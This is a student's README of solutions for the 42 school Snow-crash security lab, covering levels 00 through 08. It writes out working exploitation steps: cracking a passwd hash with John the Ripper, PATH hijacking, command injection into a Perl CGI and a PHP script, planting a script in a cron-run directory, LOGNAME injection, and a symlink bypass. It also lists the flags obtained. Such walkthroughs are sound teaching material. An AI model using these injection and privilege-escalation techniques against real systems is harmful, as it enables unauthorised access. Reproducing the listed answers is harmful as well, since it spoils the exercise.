# Snow-crash (42)

This repository contains my notes and solutions for the **Snow-crash** project at 42.

## Access

Use SSH to connect to the first level:

```bash
ssh level00@192.185.64.5 -p 4242
```

## Global workflow: 
For the upcoming levels, the pattern will often involve finding a `vulnerability in a script or binary` owned by `flagXX`. Once you exploit it to `run commands as that user`, you run `getflag` to get the `password` for the next level.

## Level 00

### Goal
Find the password for `flag00`, then use it to retrieve the token for the next level.

### Steps

Navigate through the VM and inspect interesting directories.
In `/usr/sbin`, list files and permissions:
```bash
ls -la
```
Find a file named `john`, owned by `flag00`.
Read its content:
```bash
cat john
```
Output:
```text
cdiiddwpgswtgt
```
The string is not directly usable as a password. Decode it with ROT11:
```bash
echo "cdiiddwpgswtgt" | tr 'a-z' 'l-za-k'
```
Result:
```text
nottoohardhere
```
Switch user to `flag00` with the decoded password:
```bash
su flag00
```
Run:
```bash
getflag
```
Token obtained:
```text
x24ti5gi3x0ol2eh4esiuxias
```
Use this token as the password for `level01`.
---
## Level 01

### Observations

- Running `find / -user flag01` or `find / -group flag02` returned no useful results.
- However, `/etc/passwd` is readable and shows the `flag` users and hashes:

```text
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
flag02:x:3002:3002::/home/flag/flag02:/bin/bash
flag03:x:3003:3003::/home/flag/flag03:/bin/bash
flag04:x:3004:3004::/home/flag/flag04:/bin/bash
flag05:x:3005:3005::/home/flag/flag05:/bin/bash
flag06:x:3006:3006::/home/flag/flag06:/bin/bash
flag07:x:3007:3007::/home/flag/flag07:/bin/bash
flag08:x:3008:3008::/home/flag/flag08:/bin/bash
flag09:x:3009:3009::/home/flag/flag09:/bin/bash
flag10:x:3010:3010::/home/flag/flag10:/bin/bash
flag11:x:3011:3011::/home/flag/flag11:/bin/bash
flag12:x:3012:3012::/home/flag/flag12:/bin/bash
flag13:x:3013:3013::/home/flag/flag13:/bin/bash
flag14:x:3014:3014::/home/flag/flag14:/bin/bash
```

The second field for `flag01` (`42hDRfypTqqnw`) is an encrypted password/hash.

### Approach

1. Try common hash/cracking approaches (MD5, SHA variants, bruteforce, ROTs) — no success.
2. Remember the `john` file found in Level 00: it is likely a hint to use `john` (John the Ripper).

### Commands

Use `john` with an appropriate wordlist to crack the hash (example with `john` installed locally):

```bash

echo '42hDRfypTqqnw' > hashes.txt

john hashes.txt
```
On this box, `john` cracked the password quickly:
```
abcdefg
```
### Result
Switch to `flag01` and retrieve the flag:
```bash
su flag01
getflag
```
Flag obtained:
```text
f2av5il02puano7naaf6adaaf
```
Use this flag/token as the password for `level02`.
---
Next: add `level02` notes in the same style.

## Level 02

First, extract the file from the VM to read it locally:

```bash
scp -P 4242 level02@192.168.64.6:/home/user/level02/level02.pcap ~/path/to/snowcrash
```

Now, we have a `level02.pcap` that appeared in home directory. This is a Internet catch. if we read it with `tcpdump`, its some messy strings, not really readable.... like that :
```text
07:23:12.267566 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [S], seq 2635601089, win 14600, options [mss 1460,sackOK,TS val 18592800 ecr 0,nop,wscale 7], length 0
E..<..@.@.J>;...;....O/Y..........9............
... ........
```
Let's use Wireshark, will be more readable :

..wwwbugs login:
l
.l
e
.e
v
.v
e
.e
l
.l
X
.X
..
Password:
ft_wandr...NDRel.L0L
.
..
Login incorrect
wwwbugs login:
```
we look for the password, it will certainly be the one for `flag02` !, every dot is a backspace, so the password become :
```text
ft_waNDReL0L
```
it give the flag :
```text
kooda2puivaav1idi4f57q8iq
```

Use this flag/token as the password for `level03`.

---

## Level 03

A binary appeared for `flag03`. Inspecting it with `ltrace` reveals it uses `echo` without an absolute path — it only resolves via the `PATH` environment variable.

### Vulnerability

Since the binary calls `echo` by name and not by full path (`/bin/echo`), we can hijack it by prepending a directory we control to `PATH`.

### Exploitation

1. Navigate to a temporary directory where we have write access:

```bash
cd /tmp
```

2. Create a malicious `echo` script that calls `getflag`:

```bash
echo "/bin/getflag" > echo
chmod +x echo
```

3. Prepend `/tmp` to the `PATH` and execute the binary:

```bash
export PATH=/tmp:$PATH
/path/to/level03/binary
```

4. The binary will call our fake `echo`, which in turn calls `getflag`, granting us the token directly.

Token obtained:

```text
qi0maab88jeaj46qoumi7maus
```

Use this token as the password for `level04`.

---

## Level 04

We have a Perl script called `level04.pl` running as a CGI service on `localhost:4747`. Inspecting it reveals:

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

### Vulnerability

The script takes the `x` parameter and directly interpolates it into a backtick command. This is a classic command injection vulnerability.

### Initial Attempt

We try a direct semicolon injection:

```bash
curl localhost:4747/level04.pl?x=;getflag
```

This doesn't work — the developers anticipated this and filtered it.

### Exploitation

Use backticks within the parameter to execute `getflag` as a command substitution:

```bash
curl "localhost:4747/level04.pl?x=\`getflag\`"
```

The backticks force the shell to execute `getflag` first, and since the script runs with `flag04` permissions, it returns the flag.

Token obtained:

```text
ne2searoevaevoem4ov4ar8ap
```

Use this token as the password for `level05`.

---

## Level 05

We discover an OpenArena server running with `flag05` permissions. Inspecting the binary at `usr/sbin/openarenaserver/` script:

```sh
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

### Vulnerability

This script automatically executes every file in `/opt/openarenaserver/` with a 5-second timeout, then deletes it. It runs with `flag05` permissions via cron.

### Exploitation

1. Create a malicious shell script in `/tmp`:

```bash
cat > /tmp/solve.sh << 'EOF'
#!/bin/sh
getflag > /tmp/out
EOF

chmod +x /tmp/solve.sh
```

2. Place it in the OpenArena directory:

```bash
cp /tmp/solve.sh /opt/openarenaserver/
```

3. The cron job will automatically execute it with `flag05` permissions. The output file will contain the flag:

```bash
cat /tmp/out
```

Token obtained:

```text
viuaaale9huek52boumoomioc
```

Use this token as the password for `level06`.

---

## Level 06

We have `level06` and `level06.php`. When we cat `level06.php`, we see a shebang first, then a function that executes parameters.

### Vulnerability

Trying to run it directly with this payload is rejected by the shell:

```bash
./level06 [x {${shell_exec(getflag)}}]
```

So instead, put the payload in a file under `/tmp` and pass the file as an argument.

### Exploitation

1. Create a file in `/tmp` containing the payload:

```bash
echo '[x {${shell_exec(getflag)}}]' > /tmp/level06
```

2. Run the binary using that file as the parameter:

```bash
./level06 /tmp/level06
```

3. The script evaluates the injected PHP and returns the token.

Token obtained:

```text
wiok45aaoguiboiki2tuin6ub
```

Use this token as the password for `level07`.

---

## Level 07

We have a `level07` binary. Using `strings level07`, we can see it reads environment values and uses `LOGNAME`.

When we execute it normally, it prints `level07`, so we assume it prints/interprets the `LOGNAME` value.

### Exploitation

Inject command substitution through `LOGNAME`:

```bash
export LOGNAME='$(getflag)'
./level07
```

It executes perfectly and returns the token.

Token obtained:

```text
fiumuikeil55xe9cu4dood66h
```

Use this token as the password for `level08`.

---

## Level 08

We have a `level09` executable and a file named `token`. Using `strings level08`, we can see that it is a `.c` file that takes an fd as an argument.

When we try:

```bash
./level08 token
```

it says that we don't have permission.

### Vulnerability

The program does not use `access()`, `realpath()`, or any other path validation. That means the check is likely hardcoded against the literal filename `token`.

### Exploitation

Create a symlink whose name does not contain the word `token`, pointing to the real file:

```bash
ln -s /home/user/level08/token /tmp/fake_file
```

Then run the binary with the symlink:

```bash
./level08 /tmp/fake_file
```

This gives us the token:

```text
quif5eloekouj29ke0vouxean
```

Then switch user and get the final flag:

```bash
su flag08
getflag
```

Flag obtained:

```text
25749xKZ8L7DkSCwJkT9dyv6f
```

Use this flag/token as the password for `level09`.

---

# Any tips for other flags :

## /etc
found
```
-rw-r----- 1 root shadow  4428 Mar  6  2016 shadow
-rw-r----- 1 root shadow  1119 Aug 30  2015 gshadow
```
